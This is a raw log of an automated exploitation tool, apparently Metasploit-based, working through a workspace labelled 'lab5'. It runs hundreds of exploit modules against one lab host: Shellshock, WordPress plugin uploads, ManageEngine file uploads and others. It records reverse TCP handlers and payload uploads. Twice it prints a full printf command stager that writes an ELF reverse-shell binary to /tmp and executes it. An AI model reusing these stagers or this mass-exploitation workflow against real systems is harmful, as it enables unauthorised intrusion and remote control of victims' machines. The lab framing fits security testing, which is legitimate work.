[*] [2016.06.04-10:06:09] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:06:09] [0583] Started reverse TCP handler on 0.0.0.0:1387
[*] [2016.06.04-10:06:09] [0583] Selecting target, this might take a few seconds...
[+] [2016.06.04-10:06:09] Workspace:lab5 Progress:588/775 (75%) [584/770] 10.198.0.1:8080 - Western Digital Arkeia Remote Code Execution
[*] [2016.06.04-10:06:09] [0584] Started reverse TCP handler on 0.0.0.0:1388
[*] [2016.06.04-10:06:09] [0584] Sending PHP payload which will be uploaded to hardcoded /tmp/ApplianceUpdate
[-] [2016.06.04-10:06:10] [0583] Exploit aborted due to failure: no-target: 10.198.0.1:80 - Automatic targeting failed.
[-] [2016.06.04-10:06:10] [0584] Exploit aborted due to failure: none: 10.198.0.1:8080 - File wasn't uploaded, aborting!
[+] [2016.06.04-10:06:10] Workspace:lab5 Progress:589/775 (76%) [585/770] 10.198.0.1:80 - ActualAnalyzer 'ant' Cookie Command Execution
[+] [2016.06.04-10:06:10] Workspace:lab5 Progress:590/775 (76%) [586/770] 10.198.0.1:8080 - FlashChat Arbitrary File Upload
[-] [2016.06.04-10:06:10] No reverse connect payloads available for exploit/unix/webapp/actualanalyzer_ant_cookie_exec
[-] [2016.06.04-10:06:10] No payloads were compatible with exploit/unix/webapp/actualanalyzer_ant_cookie_exec)
[-] [2016.06.04-10:06:10] [0585] Exploit failed: A payload has not been selected.
[*] [2016.06.04-10:06:10] [0586] Started reverse TCP handler on 0.0.0.0:1389
[*] [2016.06.04-10:06:10] [0586] Uploading malicious file...
[-] [2016.06.04-10:06:10] [0586] Exploit aborted due to failure: not-found: 10.198.0.1:8080 - No upload.php found
[+] [2016.06.04-10:06:10] Workspace:lab5 Progress:591/775 (76%) [587/770] 10.198.0.1:8080 - WebTester 5.x Command Execution
[-] [2016.06.04-10:06:10] No reverse connect payloads available for exploit/unix/webapp/webtester_exec
[-] [2016.06.04-10:06:10] No payloads were compatible with exploit/unix/webapp/webtester_exec)
[-] [2016.06.04-10:06:10] [0587] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:11] Workspace:lab5 Progress:592/775 (76%) [588/770] 10.198.0.1:80 - Numara / BMC Track-It! FileStorageService Arbitrary File Upload
[*] [2016.06.04-10:06:11] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:06:11] [0588] Started reverse TCP handler on 0.0.0.0:1390
[+] [2016.06.04-10:06:11] Workspace:lab5 Progress:593/775 (76%) [589/770] 10.198.0.1:80 - ManageEngine Desktop Central StatusUpdate Arbitrary File Upload
[*] [2016.06.04-10:06:11] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:06:11] [0588] Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.198.0.1:9010).
[*] [2016.06.04-10:06:11] [0589] Started reverse TCP handler on 0.0.0.0:1391
[*] [2016.06.04-10:06:11] [0589] Uploading JSP to execute the payload
[+] [2016.06.04-10:06:12] Workspace:lab5 Progress:594/775 (76%) [590/770] 10.198.0.1:80 - VMTurbo Operations Manager vmtadmin.cgi Remote Command Execution
[*] [2016.06.04-10:06:12] [0589] Executing payload
[*] [2016.06.04-10:06:12] [0590] Started reverse TCP handler on 0.0.0.0:1392
[*] [2016.06.04-10:06:12] [0590] Sent command printf '\177\105\114\106\1\1\1\0\0\0\0\0\0\0\0\0\2\0\3\0\1\0\0\0\124\200\4\10\64\0\0\0\0\0\0\0\0\0\0\0\64\0\40\0\1\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\0\200\4\10\0\200\4\10\233\0\0\0\342\0\0\0\7\0\0\0\0\20\0\0\61\333\367\343\123\103\123\152\2\260\146\211\341\315\200\227\133\150\12\306\0\2\150\2\0\5\160\211\341\152\146\130\120\121\127\211\341\103\315\200\262\7\271\0\20\0\0\211\343\301\353\14\301\343\14\260\175\315\200\133\211\341\231\266\14\260\3\315\200\377\341'>>/tmp/wkubU ; chmod +x /tmp/wkubU ; /tmp/wkubU ; rm -f /tmp/wkubU
[*] [2016.06.04-10:06:12] [0590] Command Stager progress - 100.00% done (526/526 bytes)
[+] [2016.06.04-10:06:12] Workspace:lab5 Progress:595/775 (76%) [591/770] 10.198.0.1:8080 - ProcessMaker Open Source Authenticated PHP Code Execution
[*] [2016.06.04-10:06:12] [0591] Started reverse TCP handler on 0.0.0.0:1393
[*] [2016.06.04-10:06:12] [0591] Authenticating as user 'admin'
[-] [2016.06.04-10:06:12] [0591] Authenticating as user 'admin' failed
[-] [2016.06.04-10:06:12] [0591] Exploit aborted due to failure: no-access: 10.198.0.1:8080 - Authentication failed
[+] [2016.06.04-10:06:13] Workspace:lab5 Progress:596/775 (76%) [592/770] 10.198.0.1:80 - ManageEngine Multiple Products Authenticated File Upload
[*] [2016.06.04-10:06:13] [0592] Started reverse TCP handler on 0.0.0.0:1394
[*] [2016.06.04-10:06:13] [0592] Selecting target...
[*] [2016.06.04-10:06:13] [0592] Selected target ServiceDesk Plus/Plus MSP v7.1 >= b7016 - v9.0 < b9031/AssetExplorer v5-v6.1
[-] [2016.06.04-10:06:13] [0592] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Failed to authenticate
[+] [2016.06.04-10:06:13] Workspace:lab5 Progress:597/775 (77%) [593/770] 10.198.0.1:8080 - HP LoadRunner EmulationAdmin Web Service Directory Traversal
[-] [2016.06.04-10:06:13] No reverse connect payloads available for exploit/windows/http/hp_loadrunner_copyfiletoserver
[-] [2016.06.04-10:06:13] No payloads were compatible with exploit/windows/http/hp_loadrunner_copyfiletoserver)
[-] [2016.06.04-10:06:13] [0593] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:14] Workspace:lab5 Progress:598/775 (77%) [594/770] 10.198.0.1:80 - Phpwiki Ploticus Remote Code Execution
[*] [2016.06.04-10:06:14] [0594] Started reverse TCP handler on 0.0.0.0:1395
[-] [2016.06.04-10:06:14] [0594] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Upload failed
[+] [2016.06.04-10:06:15] Workspace:lab5 Progress:599/775 (77%) [595/770] 10.198.0.1:80 - ManageEngine OpManager and Social IT Arbitrary File Upload
[*] [2016.06.04-10:06:15] [0595] Started reverse TCP handler on 0.0.0.0:1396
[*] [2016.06.04-10:06:15] [0595] Creating upload directories
[+] [2016.06.04-10:06:15] Workspace:lab5 Progress:600/775 (77%) [596/770] 10.198.0.1:8080 - Kaseya uploadImage Arbitrary File Upload
[*] [2016.06.04-10:06:15] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:06:15] [0595] Uploading WAR file...
[-] [2016.06.04-10:06:15] [0595] Exploit aborted due to failure: unknown: 10.198.0.1:80 - WAR upload failed
[*] [2016.06.04-10:06:15] [0596] Started reverse TCP handler on 0.0.0.0:1397
[*] [2016.06.04-10:06:15] [0596] Getting cookie...
[!] [2016.06.04-10:06:15] [0595] This exploit may require manual cleanup of 'state/archivedata/zip/rt2ord2' on the target
[-] [2016.06.04-10:06:15] [0596] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Failed to get cookie
[+] [2016.06.04-10:06:16] Workspace:lab5 Progress:601/775 (77%) [597/770] 10.198.0.1:80 - ManageEngine Eventlog Analyzer Arbitrary File Upload
[*] [2016.06.04-10:06:16] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:06:16] [0597] Started reverse TCP handler on 0.0.0.0:1398
[*] [2016.06.04-10:06:16] [0597] Determining target
[+] [2016.06.04-10:06:16] Workspace:lab5 Progress:602/775 (77%) [598/770] 10.198.0.1:8080 - Idera Up.Time Monitoring Station 7.0 post2file.php Arbitrary File Upload
[-] [2016.06.04-10:06:16] [0597] Unable to select a target, we must bail.
[*] [2016.06.04-10:06:16] [0598] Started reverse TCP handler on 0.0.0.0:1399
[*] [2016.06.04-10:06:16] [0598] Uploading PHP to Up.Time server
[*] [2016.06.04-10:06:16] [0598] Uploading payload AIZSL.php
[-] [2016.06.04-10:06:16] [0598] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Upload failed
[+] [2016.06.04-10:06:17] Workspace:lab5 Progress:603/775 (77%) [599/770] 10.198.0.1:8080 - OpenSIS 'modname' PHP Code Execution
[-] [2016.06.04-10:06:17] No reverse connect payloads available for exploit/unix/webapp/opensis_modname_exec
[-] [2016.06.04-10:06:17] No payloads were compatible with exploit/unix/webapp/opensis_modname_exec)
[+] [2016.06.04-10:06:17] Workspace:lab5 Progress:604/775 (77%) [600/770] 10.198.0.1:8080 - Synology DiskStation Manager SLICEUPLOAD Remote Command Execution
[-] [2016.06.04-10:06:17] No reverse connect payloads available for exploit/linux/http/synology_dsm_sliceupload_exec_noauth
[-] [2016.06.04-10:06:17] No payloads were compatible with exploit/linux/http/synology_dsm_sliceupload_exec_noauth)
[-] [2016.06.04-10:06:17] [0600] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:18] Workspace:lab5 Progress:605/775 (78%) [601/770] 10.198.0.1:80 - Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
[+] [2016.06.04-10:06:19] Workspace:lab5 Progress:606/775 (78%) [602/770] 10.198.0.1:8080 - Zimbra Collaboration Server LFI
[*] [2016.06.04-10:06:19] [0602] Started reverse TCP handler on 0.0.0.0:1401
[*] [2016.06.04-10:06:19] [0602] Getting login credentials...
[-] [2016.06.04-10:06:19] [0602] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[+] [2016.06.04-10:06:19] Workspace:lab5 Progress:607/775 (78%) [603/770] 10.198.0.1:80 - Advantech Switch Bash Environment Variable Code Injection (Shellshock)
[-] [2016.06.04-10:06:19] No reverse connect payloads available for exploit/linux/http/advantech_switch_bash_env_exec
[-] [2016.06.04-10:06:19] No payloads were compatible with exploit/linux/http/advantech_switch_bash_env_exec)
[-] [2016.06.04-10:06:19] [0603] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:20] Workspace:lab5 Progress:608/775 (78%) [604/770] 10.198.0.1:80 - CUPS Filter Bash Environment Variable Code Injection (Shellshock)
[-] [2016.06.04-10:06:20] No reverse connect payloads available for exploit/multi/http/cups_bash_env_exec
[-] [2016.06.04-10:06:20] No payloads were compatible with exploit/multi/http/cups_bash_env_exec)
[+] [2016.06.04-10:06:20] Workspace:lab5 Progress:609/775 (78%) [605/770] 10.198.0.1:8080 - ManageEngine Desktop Central AgentLogUpload Arbitrary File Upload
[*] [2016.06.04-10:06:20] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:06:21] [0605] Started reverse TCP handler on 0.0.0.0:1402
[*] [2016.06.04-10:06:21] [0605] Uploading JSP to execute the payload
[-] [2016.06.04-10:06:21] [0605] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - JSP upload failed
[+] [2016.06.04-10:06:21] Workspace:lab5 Progress:610/775 (78%) [606/770] 10.198.0.1:8080 - MediaWiki Thumb.php Remote Command Execution
[*] [2016.06.04-10:06:21] [0606] Started reverse TCP handler on 0.0.0.0:1403
[*] [2016.06.04-10:06:21] [0606] Grabbing version and login CSRF token...
[*] [2016.06.04-10:06:21] [0606] Nix platform detected: Apache-Coyote/1.1.
[-] [2016.06.04-10:06:21] [0606] Exploit aborted due to failure: unexpected-reply: Couldn't find login token. Is URI set correctly?
[+] [2016.06.04-10:06:22] Workspace:lab5 Progress:611/775 (78%) [607/770] 10.198.0.1:8080 - Fritz!Box Webcm Unauthenticated Command Injection
[-] [2016.06.04-10:06:22] No reverse connect payloads available for exploit/linux/http/fritzbox_echo_exec
[-] [2016.06.04-10:06:22] No payloads were compatible with exploit/linux/http/fritzbox_echo_exec)
[-] [2016.06.04-10:06:22] [0607] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:22] Workspace:lab5 Progress:612/775 (78%) [608/770] 10.198.0.1:80 - Rejetto HttpFileServer Remote Command Execution
[*] [2016.06.04-10:06:22] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:06:23] [0608] Started reverse TCP handler on 0.0.0.0:1404
[*] [2016.06.04-10:06:23] [0608] Using URL: http://0.0.0.0:1405/lNttUQX
[*] [2016.06.04-10:06:23] [0608] Local IP: http://10.0.2.15:1405/lNttUQX
[*] [2016.06.04-10:06:23] [0608] Server started.
[*] [2016.06.04-10:06:23] [0608] Sending a malicious request to /
[*] [2016.06.04-10:06:33] [0608] Server stopped.
[!] [2016.06.04-10:06:33] [0608] This exploit may require manual cleanup of '%TEMP%\KlLRbBHfhYVLlL.vbs' on the target
[+] [2016.06.04-10:06:33] Workspace:lab5 Progress:613/775 (79%) [609/770] 10.198.0.1:8080 - Symantec Endpoint Protection Manager /servlet/ConsoleServlet Remote Command Execution
[*] [2016.06.04-10:06:33] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:06:34] [0609] Started reverse TCP handler on 0.0.0.0:1406
[*] [2016.06.04-10:06:34] [0609] Sending payload
[-] [2016.06.04-10:06:34] [0609] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Something went wrong.
[+] [2016.06.04-10:06:35] Workspace:lab5 Progress:614/775 (79%) [610/770] 10.198.0.1:80 - TWiki Debugenableplugins Remote Code Execution
[-] [2016.06.04-10:06:35] No reverse connect payloads available for exploit/unix/http/twiki_debug_plugins
[-] [2016.06.04-10:06:35] No payloads were compatible with exploit/unix/http/twiki_debug_plugins)
[-] [2016.06.04-10:06:35] [0610] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:36] Workspace:lab5 Progress:615/775 (79%) [611/770] 10.198.0.1:8080 - Linksys E-Series TheMoon Remote Command Injection
[-] [2016.06.04-10:06:36] No reverse connect payloads available for exploit/linux/http/linksys_themoon_exec
[-] [2016.06.04-10:06:36] No payloads were compatible with exploit/linux/http/linksys_themoon_exec)
[-] [2016.06.04-10:06:36] [0611] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:36] Workspace:lab5 Progress:616/775 (79%) [612/770] 10.198.0.1:80 - Wordpress Creative Contact Form Upload Vulnerability
[*] [2016.06.04-10:06:36] [0612] Started reverse TCP handler on 0.0.0.0:1407
[-] [2016.06.04-10:06:36] [0612] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Unable to deploy payload, server returned 302
[+] [2016.06.04-10:06:37] Workspace:lab5 Progress:617/775 (79%) [613/770] 10.198.0.1:80 - WordPress RevSlider File Upload and Execute Vulnerability
[*] [2016.06.04-10:06:37] [0613] Started reverse TCP handler on 0.0.0.0:1408
[-] [2016.06.04-10:06:37] [0613] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Unable to deploy payload, server returned 200
[+] [2016.06.04-10:06:38] Workspace:lab5 Progress:618/775 (79%) [614/770] 10.198.0.1:80 - Symantec Web Gateway 5 restore.php Post Authentication Command Injection
[-] [2016.06.04-10:06:38] No reverse connect payloads available for exploit/linux/http/symantec_web_gateway_restore
[-] [2016.06.04-10:06:38] No payloads were compatible with exploit/linux/http/symantec_web_gateway_restore)
[+] [2016.06.04-10:06:38] Workspace:lab5 Progress:619/775 (79%) [615/770] 10.198.0.1:8080 - AlienVault OSSIM SQL Injection and Remote Code Execution
[-] [2016.06.04-10:06:38] No reverse connect payloads available for exploit/linux/http/alienvault_sqli_exec
[-] [2016.06.04-10:06:38] No payloads were compatible with exploit/linux/http/alienvault_sqli_exec)
[-] [2016.06.04-10:06:38] [0615] Exploit failed: A payload has not been selected.
[*] [2016.06.04-10:06:38] [0615] Cleaning up
[+] [2016.06.04-10:06:39] Workspace:lab5 Progress:620/775 (80%) [616/770] 10.198.0.1:80 - Tuleap PHP Unserialize Code Execution
[+] [2016.06.04-10:06:39] Workspace:lab5 Progress:621/775 (80%) [617/770] 10.198.0.1:80 - WordPress WP Symposium 14.11 Shell Upload
[*] [2016.06.04-10:06:39] [0617] Started reverse TCP handler on 0.0.0.0:1410
[*] [2016.06.04-10:06:39] [0617] Preparing payload
[*] [2016.06.04-10:06:39] [0617] Uploading payload to /wp-content/plugins/wp-symposium/server/php/wrjCUIsYyO/wrjCUIsYyO.php
[-] [2016.06.04-10:06:40] [0617] HTTP Status: 302
[-] [2016.06.04-10:06:40] [0617] Server returned:
[-] [2016.06.04-10:06:40] [0617] Exploit aborted due to failure: unexpected-reply: Failed to upload the payload
[+] [2016.06.04-10:06:40] Workspace:lab5 Progress:622/775 (80%) [618/770] 10.198.0.1:80 - WordPress WP EasyCart Unrestricted File Upload
[*] [2016.06.04-10:06:40] [0618] Started reverse TCP handler on 0.0.0.0:1411
[*] [2016.06.04-10:06:40] [0618] EC authentication attack is enabled
[*] [2016.06.04-10:06:40] [0618] Preparing payload...
[*] [2016.06.04-10:06:40] [0618] Uploading payload to /wp-content/plugins/wp-easycart/products/banners/CXXZKDNGob_1d178e64646f7319ee7fa3aa84c022b3.php
[-] [2016.06.04-10:06:40] [0618] Server responded with status code 302
[*] [2016.06.04-10:06:40] [0618] Executing the payload...
[+] [2016.06.04-10:06:40] [0618] Executed payload
[!] [2016.06.04-10:06:43] [0618] This exploit may require manual cleanup of 'CXXZKDNGob_1d178e64646f7319ee7fa3aa84c022b3.php' on the target
[+] [2016.06.04-10:06:43] Workspace:lab5 Progress:623/775 (80%) [619/770] 10.198.0.1:80 - WordPress Pixabay Images PHP Code Upload
[*] [2016.06.04-10:06:43] [0619] Started reverse TCP handler on 0.0.0.0:1412
[-] [2016.06.04-10:06:44] [0619] Exploit aborted due to failure: no-target: 10.198.0.1:80 - / does not seeem to be WordPress site
[+] [2016.06.04-10:06:44] Workspace:lab5 Progress:624/775 (80%) [620/770] 10.198.0.1:80 - WordPress Photo Gallery Unrestricted File Upload
[+] [2016.06.04-10:06:45] Workspace:lab5 Progress:625/775 (80%) [621/770] 10.198.0.1:80 - Wordpress InBoundio Marketing PHP Upload Vulnerability
[*] [2016.06.04-10:06:45] [0621] Started reverse TCP handler on 0.0.0.0:1415
[-] [2016.06.04-10:06:45] [0621] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Unable to deploy payload, server returned 302
[+] [2016.06.04-10:06:45] Workspace:lab5 Progress:626/775 (80%) [622/770] 10.198.0.1:80 - Novell ZENworks Configuration Management Arbitrary File Upload
[*] [2016.06.04-10:06:46] [0622] Started reverse TCP handler on 0.0.0.0:1416
[*] [2016.06.04-10:06:46] [0622] Uploading WAR file to ../../../opt/novell/zenworks/share/tomcat/webapps/
[-] [2016.06.04-10:06:46] [0622] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[+] [2016.06.04-10:06:46] Workspace:lab5 Progress:627/775 (80%) [623/770] 10.198.0.1:8080 - Symantec Workspace Streaming ManagementAgentServer.putFile XMLRPC Request Arbitrary File Upload
[*] [2016.06.04-10:06:46] [0623] Started reverse TCP handler on 0.0.0.0:1417
[*] [2016.06.04-10:06:46] [0623] Leaking the JBoss deployment directory...
[-] [2016.06.04-10:06:46] [0623] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Failed to disclose the JBoss deployment directory
[+] [2016.06.04-10:06:47] Workspace:lab5 Progress:628/775 (81%) [624/770] 10.198.0.1:8080 - SkyBlueCanvas CMS Remote Code Execution
[-] [2016.06.04-10:06:47] No reverse connect payloads available for exploit/unix/webapp/skybluecanvas_exec
[-] [2016.06.04-10:06:47] No payloads were compatible with exploit/unix/webapp/skybluecanvas_exec)
[-] [2016.06.04-10:06:47] [0624] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:47] Workspace:lab5 Progress:629/775 (81%) [625/770] 10.198.0.1:8080 - FreePBX config.php Remote Code Execution
[-] [2016.06.04-10:06:47] No reverse connect payloads available for exploit/unix/webapp/freepbx_config_exec
[-] [2016.06.04-10:06:47] No payloads were compatible with exploit/unix/webapp/freepbx_config_exec)
[-] [2016.06.04-10:06:47] [0625] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:48] Workspace:lab5 Progress:630/775 (81%) [626/770] 10.198.0.1:8080 - ElasticSearch Dynamic Script Arbitrary Java Execution
[*] [2016.06.04-10:06:48] [0626] Started reverse TCP handler on 0.0.0.0:1418
[*] [2016.06.04-10:06:48] [0626] Trying to execute arbitrary Java...
[*] [2016.06.04-10:06:48] [0626] Trying to execute 'System.getProperty("java.version")'...
[-] [2016.06.04-10:06:48] [0626] 10.198.0.1:8080 responded with HTTP code 404 (with a body)
[*] [2016.06.04-10:06:48] [0626] No results for the Java test
[-] [2016.06.04-10:06:48] [0626] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Java has not been executed, aborting...
[+] [2016.06.04-10:06:49] Workspace:lab5 Progress:631/775 (81%) [627/770] 10.198.0.1:8080 - ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
[*] [2016.06.04-10:06:49] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:06:49] [0627] Started reverse TCP handler on 0.0.0.0:1419
[*] [2016.06.04-10:06:49] [0627] Selecting target, this might take a few seconds...
[-] [2016.06.04-10:06:49] [0627] Exploit aborted due to failure: no-target: 10.198.0.1:8080 - Automatic targeting failed.
[+] [2016.06.04-10:06:49] Workspace:lab5 Progress:632/775 (81%) [628/770] 10.198.0.1:8080 - VMTurbo Operations Manager vmtadmin.cgi Remote Command Execution
[*] [2016.06.04-10:06:49] [0628] Started reverse TCP handler on 0.0.0.0:1420
[*] [2016.06.04-10:06:50] [0628] Sent command printf '\177\105\114\106\1\1\1\0\0\0\0\0\0\0\0\0\2\0\3\0\1\0\0\0\124\200\4\10\64\0\0\0\0\0\0\0\0\0\0\0\64\0\40\0\1\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\0\200\4\10\0\200\4\10\233\0\0\0\342\0\0\0\7\0\0\0\0\20\0\0\61\333\367\343\123\103\123\152\2\260\146\211\341\315\200\227\133\150\12\306\0\2\150\2\0\5\214\211\341\152\146\130\120\121\127\211\341\103\315\200\262\7\271\0\20\0\0\211\343\301\353\14\301\343\14\260\175\315\200\133\211\341\231\266\14\260\3\315\200\377\341'>>/tmp/SgFEO ; chmod +x /tmp/SgFEO ; /tmp/SgFEO ; rm -f /tmp/SgFEO
[*] [2016.06.04-10:06:50] [0628] Command Stager progress - 100.00% done (526/526 bytes)
[+] [2016.06.04-10:06:52] Workspace:lab5 Progress:633/775 (81%) [629/770] 10.198.0.1:8080 - Phpwiki Ploticus Remote Code Execution
[*] [2016.06.04-10:06:52] [0629] Started reverse TCP handler on 0.0.0.0:1421
[-] [2016.06.04-10:06:52] [0629] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Upload failed
[+] [2016.06.04-10:06:53] Workspace:lab5 Progress:634/775 (81%) [630/770] 10.198.0.1:8080 - ActualAnalyzer 'ant' Cookie Command Execution
[-] [2016.06.04-10:06:53] No reverse connect payloads available for exploit/unix/webapp/actualanalyzer_ant_cookie_exec
[-] [2016.06.04-10:06:53] No payloads were compatible with exploit/unix/webapp/actualanalyzer_ant_cookie_exec)
[-] [2016.06.04-10:06:53] [0630] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:53] Workspace:lab5 Progress:635/775 (81%) [631/770] 10.198.0.1:8080 - Numara / BMC Track-It! FileStorageService Arbitrary File Upload
[*] [2016.06.04-10:06:53] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:06:54] [0631] Started reverse TCP handler on 0.0.0.0:1422
[-] [2016.06.04-10:06:54] [0631] Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.198.0.1:9010).
[+] [2016.06.04-10:06:54] Workspace:lab5 Progress:636/775 (82%) [632/770] 10.198.0.1:8080 - ManageEngine Desktop Central StatusUpdate Arbitrary File Upload
[*] [2016.06.04-10:06:54] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:06:54] [0632] Started reverse TCP handler on 0.0.0.0:1423
[*] [2016.06.04-10:06:54] [0632] Uploading JSP to execute the payload
[*] [2016.06.04-10:06:55] [0632] Executing payload
[+] [2016.06.04-10:06:56] Workspace:lab5 Progress:637/775 (82%) [633/770] 10.198.0.1:8080 - ManageEngine OpManager and Social IT Arbitrary File Upload
[*] [2016.06.04-10:06:56] [0633] Started reverse TCP handler on 0.0.0.0:1424
[*] [2016.06.04-10:06:56] [0633] Creating upload directories
[*] [2016.06.04-10:06:56] [0633] Uploading WAR file...
[-] [2016.06.04-10:06:56] [0633] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - WAR upload failed
[!] [2016.06.04-10:06:56] [0633] This exploit may require manual cleanup of 'state/archivedata/zip/YSoX0B1algV2ss0nq6' on the target
[+] [2016.06.04-10:06:57] Workspace:lab5 Progress:638/775 (82%) [634/770] 10.198.0.1:8080 - ManageEngine Eventlog Analyzer Arbitrary File Upload
[*] [2016.06.04-10:06:57] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:06:57] [0634] Started reverse TCP handler on 0.0.0.0:1425
[*] [2016.06.04-10:06:57] [0634] Determining target
[-] [2016.06.04-10:06:57] [0634] Unable to select a target, we must bail.
[+] [2016.06.04-10:08:35] Workspace:lab5 Progress:639/775 (82%) [635/770] 10.198.0.1:8080 - CUPS Filter Bash Environment Variable Code Injection (Shellshock)
[-] [2016.06.04-10:08:35] No reverse connect payloads available for exploit/multi/http/cups_bash_env_exec
[-] [2016.06.04-10:08:35] No payloads were compatible with exploit/multi/http/cups_bash_env_exec)
[+] [2016.06.04-10:08:36] Workspace:lab5 Progress:640/775 (82%) [636/770] 10.198.0.1:8080 - Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
[+] [2016.06.04-10:08:36] Workspace:lab5 Progress:641/775 (82%) [637/770] 10.198.0.1:8080 - Advantech Switch Bash Environment Variable Code Injection (Shellshock)
[-] [2016.06.04-10:08:36] No reverse connect payloads available for exploit/linux/http/advantech_switch_bash_env_exec
[-] [2016.06.04-10:08:36] No payloads were compatible with exploit/linux/http/advantech_switch_bash_env_exec)
[-] [2016.06.04-10:08:36] [0637] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:08:37] Workspace:lab5 Progress:642/775 (82%) [638/770] 10.198.0.1:8080 - Rejetto HttpFileServer Remote Command Execution
[*] [2016.06.04-10:08:37] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:08:37] [0638] Started reverse TCP handler on 0.0.0.0:1427
[*] [2016.06.04-10:08:37] [0638] Using URL: http://0.0.0.0:1428/fJ6Sb34
[*] [2016.06.04-10:08:37] [0638] Local IP: http://10.0.2.15:1428/fJ6Sb34
[*] [2016.06.04-10:08:37] [0638] Server started.
[*] [2016.06.04-10:08:37] [0638] Sending a malicious request to /
[*] [2016.06.04-10:08:48] [0638] Server stopped.
[!] [2016.06.04-10:08:48] [0638] This exploit may require manual cleanup of '%TEMP%\UjMixuOqrcRHm.vbs' on the target
[+] [2016.06.04-10:08:48] Workspace:lab5 Progress:643/775 (82%) [639/770] 10.198.0.1:8080 - TWiki Debugenableplugins Remote Code Execution
[-] [2016.06.04-10:08:48] No reverse connect payloads available for exploit/unix/http/twiki_debug_plugins
[-] [2016.06.04-10:08:48] No payloads were compatible with exploit/unix/http/twiki_debug_plugins)
[-] [2016.06.04-10:08:48] [0639] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:08:49] Workspace:lab5 Progress:644/775 (83%) [640/770] 10.198.0.1:8080 - Wordpress Creative Contact Form Upload Vulnerability
[*] [2016.06.04-10:08:49] [0640] Started reverse TCP handler on 0.0.0.0:1429
[-] [2016.06.04-10:08:49] [0640] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Unable to deploy payload, server returned 404
[+] [2016.06.04-10:08:49] Workspace:lab5 Progress:645/775 (83%) [641/770] 10.198.0.1:8080 - WordPress RevSlider File Upload and Execute Vulnerability
[*] [2016.06.04-10:08:49] [0641] Started reverse TCP handler on 0.0.0.0:1430
[-] [2016.06.04-10:08:49] [0641] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Unable to deploy payload, server returned 404
[+] [2016.06.04-10:08:50] Workspace:lab5 Progress:646/775 (83%) [642/770] 10.198.0.1:8080 - Symantec Web Gateway 5 restore.php Post Authentication Command Injection
[-] [2016.06.04-10:08:50] No reverse connect payloads available for exploit/linux/http/symantec_web_gateway_restore
[-] [2016.06.04-10:08:50] No payloads were compatible with exploit/linux/http/symantec_web_gateway_restore)
[+] [2016.06.04-10:08:50] Workspace:lab5 Progress:647/775 (83%) [643/770] 10.198.0.1:8080 - Tuleap PHP Unserialize Code Execution
[+] [2016.06.04-10:08:51] Workspace:lab5 Progress:648/775 (83%) [644/770] 10.198.0.1:8080 - WordPress WP Symposium 14.11 Shell Upload
[*] [2016.06.04-10:08:51] [0644] Started reverse TCP handler on 0.0.0.0:1432
[*] [2016.06.04-10:08:51] [0644] Preparing payload
[*] [2016.06.04-10:08:51] [0644] Uploading payload to /wp-content/plugins/wp-symposium/server/php/NAOgSSqPSo/NAOgSSqPSo.php
[-] [2016.06.04-10:08:51] [0644] HTTP Status: 404
